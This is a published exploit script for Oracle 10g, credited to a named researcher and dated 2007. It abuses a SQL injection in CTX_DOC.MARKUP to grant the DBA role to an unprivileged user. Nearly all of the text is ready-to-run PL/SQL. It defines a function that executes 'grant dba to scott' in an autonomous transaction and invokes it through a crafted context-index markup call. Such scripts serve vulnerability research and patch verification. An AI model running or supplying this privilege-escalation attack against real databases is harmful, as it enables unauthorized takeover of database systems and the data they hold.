/******************************************************************/
/******* Oracle 10g CTX_DOC.MARKUP SQL Injection Exploit **********/
/******************************************************************/
/************ sploit grant DBA to unprivileged user ***************/
/******************************************************************/
/******************  BY Sh2kerR (Digital Security)  ***************/
/******************************************************************/
/***************** tested on oracle 10.1.0.2.0  *******************/
/******************************************************************/
/******************************************************************/
/*         Date of Public EXPLOIT:  October 23, 2007              */
/*         Written by:              Alexandr "Sh2kerr" Polyakov   */
/*         email:                   Alexandr.Polyakov@dsec.ru     */
/*         site:                    http://www.dsec.ru            */
/******************************************************************/
/*  Original Advisory by:                                         */
/*        David Litchfield [ davidl@ngssoftware.com ]             */
/*        Reported: 6 June 2005                                   */
/*        Date of Public Advisory: October 17, 2007               */
/*        Advisory number: #NISR17102007A                         */
/*                                                                */
/******************************************************************/

select * from user_role_privs;


CREATE OR REPLACE FUNCTION HACKIT return varchar2
authid current_user as
pragma autonomous_transaction;
BEGIN
EXECUTE IMMEDIATE 'grant dba to scott';
COMMIT;
RETURN '';
END;
/


set serveroutput on

create table mark_tab (id number primary key, text varchar2(80) );

insert into mark_tab values ('1', 'All your bases are belong to US');

create index mark_tab_idx on mark_tab(text)
        indextype is ctxsys.context parameters
        ('filter ctxsys.null_filter');


SET SERVEROUTPUT ON;
DECLARE
     mklob CLOB;
     amt NUMBER := 40;
     line VARCHAR2(80);
     BEGIN
       CTX_DOC.MARKUP('mark_tab_idx','1',''||scott.HACKIT()||'', mklob);
       DBMS_LOB.READ(mklob, amt, 1, line);
       DBMS_OUTPUT.PUT_LINE('QWRvcmUuVS5NeS5TdGFy'||line);
       DBMS_LOB.FREETEMPORARY(mklob);
       END;
     /


select * from user_role_privs;

/******************************************************************/
/*************************** SEE U LATER  ;)  ***********************/
/******************************************************************/
